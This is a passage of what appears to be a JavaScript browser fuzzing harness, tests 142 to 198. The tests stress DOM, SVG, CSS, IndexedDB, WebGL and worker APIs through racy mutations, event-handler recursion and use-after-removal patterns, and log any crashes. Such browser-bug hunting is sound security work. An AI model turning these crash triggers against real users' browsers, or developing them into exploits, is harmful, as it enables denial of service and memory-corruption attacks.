                
                out.value = 'Changed';
                
                form.onreset = function() {
                    // Access element during reset
                    out.remove();
                };
                
                form.reset();
            } catch(e) {
                addLog('Test 142 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 143: SVG Gradient Cycle
        function test143_GradientCycle() {
            addLog('TEST 143: SVG LinearGradient href cycle');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                const grad1 = document.createElementNS('http://www.w3.org/2000/svg', 'linearGradient');
                const grad2 = document.createElementNS('http://www.w3.org/2000/svg', 'linearGradient');
                
                grad1.id = 'g1';
                grad2.id = 'g2';
                
                grad1.setAttributeNS('http://www.w3.org/1999/xlink', 'href', '#g2');
                grad2.setAttributeNS('http://www.w3.org/1999/xlink', 'href', '#g1');
                
                svg.appendChild(grad1);
                svg.appendChild(grad2);
                testArea.appendChild(svg);
                
                // Force render attempt
                const rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
                rect.setAttribute('fill', 'url(#g1)');
                svg.appendChild(rect);
            } catch(e) {
                addLog('Test 143 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 144: Details Toggle Recursion
        function test144_DetailsToggleLoop() {
            addLog('TEST 144: <details> toggle event stack overflow/crash');
            try {
                const details = document.createElement('details');
                testArea.appendChild(details);
                
                let count = 0;
                details.ontoggle = function() {
                    if (count++ < 100) {
                        details.open = !details.open; // Recursive toggle
                        // Mutate children
                        details.innerHTML = 'Count ' + count;
                    }
                };
                
                details.open = true;
            } catch(e) {
                addLog('Test 144 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 145: CSS Keyframes Mutation
        function test145_KeyframesMutation() {
            addLog('TEST 145: Modifying active keyframes');
            try {
                const style = document.createElement('style');
                style.textContent = '@keyframes move { from { top: 0; } to { top: 100px; } } div { animation: move 1s infinite; position: relative; }';
                document.head.appendChild(style);
                
                const div = document.createElement('div');
                testArea.appendChild(div);
                
                const rules = style.sheet.cssRules;
                const keyframes = rules[0];
                
                setInterval(() => {
                    if (keyframes && keyframes.appendRule) {
                        keyframes.appendRule('50% { top: 50px; }');
                        keyframes.deleteRule('from');
                    }
                }, 10);
                
                // Stop after 200ms
                setTimeout(() => document.head.removeChild(style), 200);
            } catch(e) {
                addLog('Test 145 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 146: XPath Namespace Mutation
        function test146_XPathNamespace() {
            addLog('TEST 146: XPath evaluation with namespace mutation');
            try {
                const xml = new DOMParser().parseFromString('<root xmlns:x="http://a.com"><x:item/></root>', 'text/xml');
                const resolver = xml.createNSResolver(xml.documentElement);
                
                const iter = xml.evaluate('//x:item', xml, resolver, XPathResult.ANY_TYPE, null);
                
                // Mutate namespace attribute while iterating
                xml.documentElement.setAttribute('xmlns:x', 'http://b.com');
                iter.iterateNext();
            } catch(e) {
                addLog('Test 146 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 147: Slot Assign Crash
        function test147_SlotAssignCrash() {
            addLog('TEST 147: Manual slot assignment thrashing');
            try {
                const host = document.createElement('div');
                if (host.attachShadow) {
                    const shadow = host.attachShadow({mode: 'open'});
                    const slot = document.createElement('slot');
                    shadow.appendChild(slot);
                    
                    const d1 = document.createElement('div');
                    const d2 = document.createElement('div');
                    host.appendChild(d1);
                    host.appendChild(d2);
                    
                    if (slot.assign) {
                        for(let i=0; i<100; i++) {
                            slot.assign(d1, d2);
                            slot.assign(d2, d1);
                            slot.assign(); // Empty
                        }
                    }
                }
                testArea.appendChild(host);
            } catch(e) {
                addLog('Test 147 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 148: AudioParam Cancel
        function test148_AudioParamCancel() {
            addLog('TEST 148: AudioParam scheduled values + cancel');
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                
                osc.connect(gain);
                
                // Flood schedule
                for(let i=0; i<100; i++) {
                    gain.gain.setValueAtTime(i/100, ctx.currentTime + i);
                    gain.gain.linearRampToValueAtTime(0, ctx.currentTime + i + 0.5);
                }
                
                // Cancel immediately
                gain.gain.cancelScheduledValues(0);
                osc.start();
                osc.stop();
            } catch(e) {
                addLog('Test 148 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 149: Canvas Pattern 0x0
        function test149_CanvasPatternZero() {
            addLog('TEST 149: Create pattern from 0x0 canvas');
            try {
                const c1 = document.createElement('canvas');
                c1.width = 0;
                c1.height = 0;
                const c2 = document.createElement('canvas');
                const ctx = c2.getContext('2d');
                
                const p = ctx.createPattern(c1, 'repeat'); // Should throw or handle gracefully
                ctx.fillStyle = p;
                ctx.fillRect(0,0,100,100);
            } catch(e) {
                addLog('Test 149 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 150: DOMSubtreeModified Remove
        function test150_DOMSubtreeRemove() {
            addLog('TEST 150: Removing node inside DOMSubtreeModified');
            try {
                const div = document.createElement('div');
                const child = document.createElement('span');
                div.appendChild(child);
                testArea.appendChild(div);
                
                div.addEventListener('DOMSubtreeModified', function() {
                    if (div.firstChild) {
                        div.removeChild(div.firstChild);
                    }
                });
                
                // Trigger event
                child.setAttribute('id', 'test');
            } catch(e) {
                addLog('Test 150 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 151: Ruby Base Merge
        function test151_RubyBaseMerge() {
            addLog('TEST 151: Ruby element complex structure manipulation');
            try {
                const ruby = document.createElement('ruby');
                const base = document.createElement('rb');
                const text = document.createElement('rt');
                ruby.appendChild(base);
                ruby.appendChild(text);
                testArea.appendChild(ruby);
                
                // Manipulate ruby structure
                ruby.removeChild(base);
                ruby.appendChild(document.createElement('rb'));
                ruby.innerHTML = '';
            } catch(e) {
                addLog('Test 151 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 152: Object Data Attribute
        function test152_ObjectDataAttr() {
            addLog('TEST 152: Object element data attribute mutation');
            try {
                const obj = document.createElement('object');
                testArea.appendChild(obj);
                
                // Rapidly change data type to force plugin reloading/unloading
                for(let i=0; i<20; i++) {
                    obj.data = (i%2===0) ? 'about:blank' : 'data:text/html,test';
                    obj.type = (i%2===0) ? 'text/html' : 'image/svg+xml';
                }
            } catch(e) {
                addLog('Test 152 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 153: Textarea Wrap Crash
        function test153_TextareaWrapCrash() {
            addLog('TEST 153: Textarea wrap attribute thrashing');
            try {
                const ta = document.createElement('textarea');
                ta.value = 'Long text '.repeat(100);
                testArea.appendChild(ta);
                
                for(let i=0; i<100; i++) {
                    ta.wrap = (i%2===0) ? 'off' : 'soft';
                    // Force layout
                    const h = ta.scrollHeight;
                }
            } catch(e) {
                addLog('Test 153 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 154: Fetch Abort Signal Reuse
        function test154_FetchAbortSignal() {
            addLog('TEST 154: Fetch with aborted signal');
            try {
                const controller = new AbortController();
                const signal = controller.signal;
                controller.abort();
                
                // Use already aborted signal multiple times
                for(let i=0; i<10; i++) {
                    fetch('about:blank', {signal: signal}).catch(e=>{});
                }
            } catch(e) {
                addLog('Test 154 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 155: Map GC Pressure
        function test155_MapGarbageCollect() {
            addLog('TEST 155: Map object creation/deletion pressure');
            try {
                const map = new Map();
                for(let i=0; i<10000; i++) {
                    const key = {id: i}; // Object key
                    map.set(key, i);
                    if (i % 100 === 0) map.delete(key);
                }
                map.clear();
            } catch(e) {
                addLog('Test 155 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 156: Large String Stack
        function test156_LargeStringStack() {
            addLog('TEST 156: Recursive huge string concatenation');
            try {
                let s = 'a';
                for(let i=0; i<20; i++) {
                    s += s; // Exponential growth
                    const div = document.createElement('div');
                    div.setAttribute('data-test', s); // Heavy attribute
                }
            } catch(e) {
                addLog('Test 156 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 157: Document Open Blast (FINAL)
        function test157_DocumentOpenBlast() {
            addLog('TEST 157: document.open() spam');
            try {
                const iframe = document.createElement('iframe');
                testArea.appendChild(iframe);
                const doc = iframe.contentDocument;
                
                for(let i=0; i<50; i++) {
                    doc.open();
                    doc.write('<script>console.log("X")<\/script>');
                    doc.close();
                }
            } catch(e) {
                addLog('Test 157 Exception: ' + e.message, true);
                crashes++;
            }
        }
// TEST 158: Table TFoot + WebKit Fullscreen Change
        function test158_DeleteTFootFullscreen() {
            addLog('TEST 158: deleteTFoot during fullscreen change');
            try {
                const table = document.createElement('table');
                table.createTFoot().insertRow().insertCell().textContent = 'Footer';
                testArea.appendChild(table);
                
                document.onwebkitfullscreenchange = function() {
                    table.deleteTFoot();
                    // Force layout recalc immediately
                    table.getBoundingClientRect();
                    table.createTFoot();
                };
                
                // Simulate event
                document.dispatchEvent(new Event('webkitfullscreenchange'));
            } catch(e) {
                addLog('Test 158 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 159: AdoptNode + TreeWalker
        function test159_AdoptWalkerRace() {
            addLog('TEST 159: adoptNode while TreeWalker is active');
            try {
                const doc2 = document.implementation.createHTMLDocument('doc2');
                const root = document.createElement('div');
                root.innerHTML = '<span>A</span><span>B</span>';
                testArea.appendChild(root);
                
                const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
                walker.nextNode(); // Point to first span
                
                // Adopt the root into another document while walker points inside
                doc2.adoptNode(root);
                
                // Try to use walker in original doc context
                walker.nextNode(); 
            } catch(e) {
                addLog('Test 159 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 160: SVG createSVGTransform + Resize Loop
        function test160_SVGTransformResize() {
            addLog('TEST 160: SVG Transform creation in resize loop');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                testArea.appendChild(svg);
                
                window.onresize = function() {
                    if (svg.createSVGTransform) {
                        for(let i=0; i<50; i++) {
                            const t = svg.createSVGTransform();
                            t.setRotate(45, 0, 0);
                        }
                    }
                };
                
                // Trigger multiple resize events
                for(let i=0; i<10; i++) window.dispatchEvent(new Event('resize'));
            } catch(e) {
                addLog('Test 160 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 161: PathSegClosePath + AnimationFrame
        function test161_PathSegFrame() {
            addLog('TEST 161: SVG PathSeg in RAF loop');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
                svg.appendChild(path);
                testArea.appendChild(svg);
                
                function loop() {
                    if (path.createSVGPathSegClosePath) {
                        const seg = path.createSVGPathSegClosePath();
                        // Potentially leaky object if not attached
                    }
                    requestAnimationFrame(loop);
                }
                
                loop();
                setTimeout(() => testArea.innerHTML = '', 500); // Stop after 500ms
            } catch(e) {
                addLog('Test 161 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 162: getSVGDocument + Iframe Removal
        function test162_SVGDocIframeRem() {
            addLog('TEST 162: Access SVGDocument and remove iframe');
            try {
                const object = document.createElement('object');
                object.type = 'image/svg+xml';
                object.data = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"/>';
                testArea.appendChild(object);
                
                object.onload = function() {
                    const doc = object.getSVGDocument();
                    testArea.removeChild(object);
                    // Access doc after parent removal
                    doc.createElement('rect');
                };
            } catch(e) {
                addLog('Test 162 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 163: importNode + MutationObserver
        function test163_ImportMutation() {
            addLog('TEST 163: importNode triggering MutationObserver');
            try {
                const obs = new MutationObserver(() => {
                    testArea.innerHTML = ''; // Nuke everything
                });
                obs.observe(testArea, {childList: true, subtree: true});
                
                const otherDoc = document.implementation.createHTMLDocument();
                const div = otherDoc.createElement('div');
                div.appendChild(otherDoc.createElement('span'));
                
                // Import deep should trigger creations
                const imported = document.importNode(div, true);
                testArea.appendChild(imported);
            } catch(e) {
                addLog('Test 163 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 164: replaceChild + onfocusin
        function test164_ReplaceFocusIn() {
            addLog('TEST 164: replaceChild inside focusin');
            try {
                const container = document.createElement('div');
                const input1 = document.createElement('input');
                const input2 = document.createElement('input');
                container.appendChild(input1);
                testArea.appendChild(container);
                
                container.addEventListener('focusin', function() {
                    container.replaceChild(input2, input1);
                    input2.focus(); // Recursive focus potential
                });
                
                input1.focus();
            } catch(e) {
                addLog('Test 164 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 165: removeChild + onfocusout
        function test165_RemoveFocusOut() {
            addLog('TEST 165: removeChild inside focusout');
            try {
                const container = document.createElement('div');
                const input = document.createElement('input');
                container.appendChild(input);
                testArea.appendChild(container);
                
                input.focus();
                
                input.addEventListener('focusout', function() {
                    if (input.parentNode) {
                        input.parentNode.removeChild(input);
                    }
                });
                
                input.blur();
            } catch(e) {
                addLog('Test 165 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 166: innerHTML + DOMNodeRemoved
        function test166_InnerNodeRemoved() {
            addLog('TEST 166: innerHTML setter with DOMNodeRemoved');
            try {
                const div = document.createElement('div');
                div.innerHTML = '<span>Remove Me</span>';
                testArea.appendChild(div);
                
                const span = div.firstChild;
                span.addEventListener('DOMNodeRemoved', function() {
                    // Access parent while it's being cleared
                    div.innerHTML = '<b>Race</b>'; 
                });
                
                div.innerHTML = ''; // Trigger removal
            } catch(e) {
                addLog('Test 166 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 167: outerHTML + DOMNodeInserted
        function test167_OuterNodeInserted() {
            addLog('TEST 167: outerHTML with DOMNodeInserted');
            try {
                const div = document.createElement('div');
                testArea.appendChild(div);
                
                document.addEventListener('DOMNodeInserted', function(e) {
                    if (e.target.tagName === 'SPAN') {
                        // Modifying DOM during insertion event
                        e.target.parentNode.removeChild(e.target);
                    }
                });
                
                div.outerHTML = '<span>Insert</span>';
            } catch(e) {
                addLog('Test 167 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 168: textContent + DOMCharacterDataModified
        function test168_TextCharMod() {
            addLog('TEST 168: textContent loop via Mutation Event');
            try {
                const div = document.createElement('div');
                const text = document.createTextNode('Start');
                div.appendChild(text);
                testArea.appendChild(div);
                
                let count = 0;
                text.addEventListener('DOMCharacterDataModified', function() {
                    if (count++ < 50) {
                        text.data = 'Mod ' + count; // Recursive modification
                    }
                });
                
                text.data = 'Trigger';
            } catch(e) {
                addLog('Test 168 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 169: deleteCell + colspan layout thrashing
        function test169_DeleteCellColspan() {
            addLog('TEST 169: deleteCell + colspan modification');
            try {
                const table = document.createElement('table');
                const row = table.insertRow();
                for(let i=0; i<10; i++) row.insertCell();
                testArea.appendChild(table);
                
                for(let i=0; i<9; i++) {
                    row.cells[0].colSpan = i + 2;
                    row.deleteCell(1); // Shifts indices
                    // Force layout
                    table.offsetWidth;
                }
            } catch(e) {
                addLog('Test 169 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 170: deleteRow + rowspan layout thrashing
        function test170_DeleteRowRowspan() {
            addLog('TEST 170: deleteRow + rowspan modification');
            try {
                const table = document.createElement('table');
                for(let i=0; i<10; i++) {
                    const r = table.insertRow();
                    r.insertCell().textContent = i;
                }
                testArea.appendChild(table);
                
                const cell = table.rows[0].cells[0];
                cell.rowSpan = 10;
                
                for(let i=1; i<9; i++) {
                    table.deleteRow(1);
                    table.offsetHeight; // Force layout
                }
            } catch(e) {
                addLog('Test 170 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 171: suspendRedraw + alert (UI blocking)
        function test171_SuspendAlertRace() {
            addLog('TEST 171: suspendRedraw + blocking alert');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                testArea.appendChild(svg);
                
                if (svg.suspendRedraw) {
                    const id = svg.suspendRedraw(1000);
                    // Blocking call might mess up the timer/redraw queue
                    // window.alert('Blocking'); // Commented to avoid manual interaction req, simulated with heavy loop
                    const start = Date.now();
                    while(Date.now() - start < 100); 
                    
                    testArea.removeChild(svg);
                    if (svg.unsuspendRedraw) svg.unsuspendRedraw(id);
                }
            } catch(e) {
                addLog('Test 171 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 172: Canvas putImageData + Worker Message
        function test172_CanvasWorkerMsg() {
            addLog('TEST 172: Canvas manipulation via Worker msg');
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const img = ctx.createImageData(100, 100);
                
                const worker = new Worker(URL.createObjectURL(new Blob(['onmessage = () => postMessage("go")'])));
                
                worker.onmessage = function() {
                    ctx.putImageData(img, 0, 0);
                    canvas.width = 0; // Resize race
                };
                
                testArea.appendChild(canvas);
                worker.postMessage('start');
            } catch(e) {
                addLog('Test 172 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 173: WebGL loseContext + restoreContext loop
        function test173_WebGLLoseRestore() {
            addLog('TEST 173: WebGL lose/restore context loop');
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const ext = gl ? gl.getExtension('WEBGL_lose_context') : null;
                
                if (ext) {
                    let count = 0;
                    canvas.addEventListener('webglcontextlost', (e) => {
                        e.preventDefault();
                        if (count++ < 10) ext.restoreContext();
                    });
                    
                    ext.loseContext();
                }
            } catch(e) {
                addLog('Test 173 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 174: IndexedDB Cursor + deleteObjectStore
        function test174_IDBCursorDelete() {
            addLog('TEST 174: IDB Cursor iteration vs Store deletion');
            try {
                const req = indexedDB.open('cursorDB', 1);
                req.onupgradeneeded = function(e) {
                    const db = e.target.result;
                    const store = db.createObjectStore('s', {keyPath: 'id'});
                    store.put({id: 1});
                    store.put({id: 2});
                    
                    store.openCursor().onsuccess = function(ev) {
                        const cursor = ev.target.result;
                        if (cursor) {
                            db.deleteObjectStore('s'); // Nuke store while iterating
                            cursor.continue();
                        }
                    };
                };
            } catch(e) {
                addLog('Test 174 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 175: IndexedDB createIndex + Transaction Abort
        function test175_IDBIndexAbort() {
            addLog('TEST 175: IDB createIndex + Abort');
            try {
                const req = indexedDB.open('indexAbortDB', 1);
                req.onupgradeneeded = function(e) {
                    const db = e.target.result;
                    const store = db.createObjectStore('s');
                    const trans = e.target.transaction;
                    
                    store.createIndex('idx', 'val');
                    trans.abort(); // Abort index creation
                    
                    // Try to access 'idx' (might crash if internal ptr lingering)
                    try { store.index('idx'); } catch(err){}
                };
            } catch(e) {
                addLog('Test 175 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 176: Selection removeAllRanges/addRange thrash
        function test176_SelectionThrash() {
            addLog('TEST 176: Selection rapid add/remove');
            try {
                const div = document.createElement('div');
                div.textContent = 'Selection';
                testArea.appendChild(div);
                const range = document.createRange();
                range.selectNode(div);
                const sel = window.getSelection();
                
                for(let i=0; i<100; i++) {
                    sel.removeAllRanges();
                    sel.addRange(range);
                }
            } catch(e) {
                addLog('Test 176 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 177: Range detach + setStart
        function test177_RangeDetachSet() {
            addLog('TEST 177: Range detach followed by setStart');
            try {
                const div = document.createElement('div');
                testArea.appendChild(div);
                const range = document.createRange();
                
                range.detach(); // Deprecated but often buggy if still exists
                range.setStart(div, 0); // Should re-init or fail safely
            } catch(e) {
                addLog('Test 177 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 178: History pushState + Blob URL
        function test178_HistoryStateBlob() {
            addLog('TEST 178: History state with Blob URL');
            try {
                const blob = new Blob(['data'], {type: 'text/plain'});
                const url = URL.createObjectURL(blob);
                
                history.pushState({url: url}, 'blob', '#blob');
                URL.revokeObjectURL(url);
                // Navigate back to state with revoked URL
                history.back();
            } catch(e) {
                addLog('Test 178 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 179: Window Open + postMessage
        function test179_WindowOpenMessage() {
            addLog('TEST 179: Window open/close message race');
            try {
                const w = window.open('about:blank');
                if (w) {
                    w.postMessage('init', '*');
                    w.close();
                    w.postMessage('race', '*'); // Send to closed
                }
            } catch(e) {
                addLog('Test 179 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 180: CSS Media Nested Insert
        function test180_CSSMediaNested() {
            addLog('TEST 180: Deeply nested @media insertRule');
            try {
                const style = document.createElement('style');
                document.head.appendChild(style);
                let rule = 'body { color: red; }';
                
                // Wrap 50 times
                for(let i=0; i<50; i++) {
                    rule = `@media screen { ${rule} }`;
                }
                
                style.sheet.insertRule(rule, 0);
            } catch(e) {
                addLog('Test 180 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 181: CSS deleteRule Random
        function test181_CSSDeleteRandom() {
            addLog('TEST 181: Random CSS rule deletion');
            try {
                const style = document.createElement('style');
                document.head.appendChild(style);
                const sheet = style.sheet;
                
                for(let i=0; i<100; i++) sheet.insertRule(`.c${i} { width: ${i}px }`, i);
                
                for(let i=0; i<50; i++) {
                    const idx = Math.floor(Math.random() * sheet.cssRules.length);
                    sheet.deleteRule(idx);
                }
            } catch(e) {
                addLog('Test 181 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 182: Canvas isPointInPath Infinity
        function test182_CanvasInfinity() {
            addLog('TEST 182: Canvas point check with Infinity');
            try {
                const ctx = document.createElement('canvas').getContext('2d');
                ctx.rect(0,0,10,10);
                ctx.isPointInPath(Infinity, Infinity);
                ctx.isPointInPath(NaN, NaN);
            } catch(e) {
                addLog('Test 182 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 183: TextTrack Mode Switching
        function test183_TrackModeSwitch() {
            addLog('TEST 183: Rapid TextTrack mode switch');
            try {
                const v = document.createElement('video');
                const t = v.addTextTrack('subtitles');
                
                for(let i=0; i<100; i++) {
                    t.mode = 'showing';
                    t.mode = 'disabled';
                }
            } catch(e) {
                addLog('Test 183 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 184: Object Data Mutation
        function test184_ObjectDataMutation() {
            addLog('TEST 184: Object data/type thrashing');
            try {
                const obj = document.createElement('object');
                testArea.appendChild(obj);
                
                for(let i=0; i<20; i++) {
                    obj.data = 'about:blank';
                    obj.type = 'text/html';
                    obj.type = 'image/svg+xml';
                }
            } catch(e) {
                addLog('Test 184 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 185: Details Summary Remove
        function test185_DetailsSummaryRem() {
            addLog('TEST 185: Removing summary from open details');
            try {
                const d = document.createElement('details');
                const s = document.createElement('summary');
                d.appendChild(s);
                d.open = true;
                testArea.appendChild(d);
                
                d.removeChild(s);
                d.open = false; // Toggle without summary
            } catch(e) {
                addLog('Test 185 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 186: Table Section Swap
        function test186_TableSectionSwap() {
            addLog('TEST 186: Swapping THead/TFoot rapidly');
            try {
                const t = document.createElement('table');
                const h = t.createTHead();
                const f = t.createTFoot();
                testArea.appendChild(t);
                
                for(let i=0; i<50; i++) {
                    t.appendChild(h); // Move to end
                    t.appendChild(f); // Move to end
                }
            } catch(e) {
                addLog('Test 186 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 187: STORM FINAL (Mixed)
        function test187_StormFinal() {
            addLog('TEST 187: Combined storm of events');
            try {
                const div = document.createElement('div');
                testArea.appendChild(div);
                
                // Mix of operations
                const t = setInterval(() => div.innerHTML = '<b>' + Math.random() + '</b>', 5);
                const s = setInterval(() => {
                    const sel = window.getSelection();
                    sel.selectAllChildren(div);
                }, 5);
                
                setTimeout(() => {
                    clearInterval(t);
                    clearInterval(s);
                    testArea.innerHTML = '';
                }, 500);
            } catch(e) {
                addLog('Test 187 Exception: ' + e.message, true);
                crashes++;
            }
        }
// TEST 188: Table Row Move between Sections
        function test188_TableRowSectionSwap() {
            addLog('TEST 188: Moving rows between THead/TBody/TFoot');
            try {
                const table = document.createElement('table');
                const thead = table.createTHead();
                const tbody = table.createTBody();
                const row = tbody.insertRow();
                testArea.appendChild(table);
                
                for(let i=0; i<100; i++) {
                    thead.appendChild(row); // Move to head
                    tbody.appendChild(row); // Move back to body
                    // Access row cells during move
                    row.cells; 
                }
            } catch(e) {
                addLog('Test 188 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 189: SVG TransformList Consolidate
        function test189_SVGTransformConsolidate() {
            addLog('TEST 189: SVG transform list consolidation race');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                const rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
                svg.appendChild(rect);
                testArea.appendChild(svg);
                
                const tList = rect.transform.baseVal;
                const t1 = svg.createSVGTransform();
                const t2 = svg.createSVGTransform();
                
                for(let i=0; i<50; i++) {
                    tList.appendItem(t1);
                    tList.appendItem(t2);
                    tList.consolidate(); // Merges transforms
                    tList.clear();
                }
            } catch(e) {
                addLog('Test 189 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 190: Canvas Font Loading Race
        function test190_CanvasFontRace() {
            addLog('TEST 190: Canvas font setting vs FontFace removal');
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                const font = new FontFace('CrashFont', 'url(about:blank)');
                document.fonts.add(font);
                
                ctx.font = '20px CrashFont';
                ctx.fillText('test', 10, 10);
                
                document.fonts.delete(font);
                ctx.fillText('test', 10, 10); // Use deleted font
            } catch(e) {
                addLog('Test 190 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 191: Range ComparePoint Detached
        function test191_RangeCompareDetached() {
            addLog('TEST 191: Range comparePoint on detached node');
            try {
                const div = document.createElement('div');
                const p = document.createElement('p');
                div.appendChild(p);
                testArea.appendChild(div);
                
                const range = document.createRange();
                range.selectNode(div);
                
                testArea.removeChild(div);
                // Compare point in detached tree
                range.comparePoint(p, 0);
            } catch(e) {
                addLog('Test 191 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 192: Selection Collapse to Null/Detached
        function test192_SelectionCollapseNull() {
            addLog('TEST 192: Selection collapse to null/detached');
            try {
                const div = document.createElement('div');
                testArea.appendChild(div);
                const sel = window.getSelection();
                
                sel.selectAllChildren(div);
                testArea.removeChild(div);
                
                // Attempt to collapse to the detached node
                try { sel.collapse(div, 0); } catch(e){}
                // Attempt to collapse to null
                try { sel.collapse(null, 0); } catch(e){}
            } catch(e) {
                addLog('Test 192 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 193: Object Type Cycle
        function test193_ObjectTypeCycle() {
            addLog('TEST 193: Cycling <object> type attribute');
            try {
                const obj = document.createElement('object');
                testArea.appendChild(obj);
                
                // Rapidly switch between types that trigger different parsers/plugins
                const types = ['image/png', 'text/html', 'application/x-shockwave-flash', 'image/svg+xml'];
                
                for(let i=0; i<50; i++) {
                    obj.type = types[i % types.length];
                    // Force attribute update
                    obj.getAttribute('type');
                }
            } catch(e) {
                addLog('Test 193 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 194: AudioContext Close Race
        function test194_AudioContextClose() {
            addLog('TEST 194: Create/Close AudioContext loop');
            try {
                const AudioCtor = window.AudioContext || window.webkitAudioContext;
                if (AudioCtor) {
                    for(let i=0; i<10; i++) {
                        const ctx = new AudioCtor();
                        const osc = ctx.createOscillator();
                        osc.start();
                        ctx.close(); // Close immediately
                        try { osc.stop(); } catch(e){}
                    }
                }
            } catch(e) {
                addLog('Test 194 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 195: Worker Message Ping Pong + Transfer
        function test195_WorkerMessagePingPong() {
            addLog('TEST 195: Worker Transferable Ping-Pong');
            try {
                const code = `onmessage = function(e) { postMessage(e.data, [e.data]); }`;
                const worker = new Worker(URL.createObjectURL(new Blob([code])));
                
                let ab = new ArrayBuffer(1024);
                worker.onmessage = function(e) {
                    ab = e.data;
                    // Send back immediately
                    if (ab.byteLength > 0) worker.postMessage(ab, [ab]);
                };
                
                worker.postMessage(ab, [ab]);
                // Stop after 500ms
                setTimeout(() => worker.terminate(), 500);
            } catch(e) {
                addLog('Test 195 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 196: StyleSheet Disabled Toggle
        function test196_StyleSheetDisabled() {
            addLog('TEST 196: Toggling stylesheet disabled state');
            try {
                const style = document.createElement('style');
                document.head.appendChild(style);
                const sheet = style.sheet;
                
                for(let i=0; i<100; i++) {
                    sheet.disabled = !sheet.disabled;
                    if (!sheet.disabled) {
                        sheet.insertRule('body { color: red; }', 0);
                        sheet.deleteRule(0);
                    }
                }
            } catch(e) {
                addLog('Test 196 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 197: Iframe Sandbox Toggle
        function test197_IframeSandboxToggle() {
            addLog('TEST 197: Toggling iframe sandbox attribute');
            try {
                const iframe = document.createElement('iframe');
                testArea.appendChild(iframe);
                
                // Changing sandbox forces reload usually
                iframe.sandbox = 'allow-scripts';
                iframe.src = 'javascript:void(0)';
                iframe.sandbox = '';
                iframe.removeAttribute('sandbox');
            } catch(e) {
                addLog('Test 197 Exception: ' + e.message, true);
                crashes++;
            }
        }

        // TEST 198: SVG Use Deep Recursion
        function test198_SVGUseDeep() {
            addLog('TEST 198: SVG <use> deep chain');
            try {
                const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                testArea.appendChild(svg);
                
                let lastId = 'rect';
                const rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
                rect.id = lastId;
                svg.appendChild(rect);
                
                for(let i=0; i<50; i++) {
                    const use = document.createElementNS('http://www.w3.org/2000/svg', 'use');
                    use.id = 'u' + i;
                    use.setAttributeNS('http://www.w3.org/1999/xlink', 'href', '#' + lastId);
